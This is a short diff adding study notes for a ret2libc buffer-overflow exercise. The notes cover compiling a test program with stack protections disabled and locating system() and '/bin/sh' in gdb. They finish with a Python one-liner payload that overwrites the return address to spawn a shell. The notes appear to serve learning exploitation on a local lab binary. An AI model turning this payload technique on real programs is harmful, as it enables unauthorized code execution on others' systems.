@@ -1,0 +1,21 @@
+step
+
+1. MAKE EXECUTABLE FILE  
+gcc -m32 -no-pie -fno-stack-protector -o rop rop.c
+
+2.RUN IN GDB 
+ gdb ./rop
+
+3. BREAK THE VULNERABLE FUNCTION: disassemble vulnerable_function
+0x6c is current stack frame
+ 
+4.get the system : p system 
+
+5. find /bin/sh address : x/s (char *)not_used
+
+6. run python script 
+
+./rop `python2 -c 'print("A"*0x6c + "BBBB" + "\x60\x90\x04\x08" + "CCCC" + "\x08\xa0\x04\x08")'`
+
+1. system address
+2. /bin/sh address 
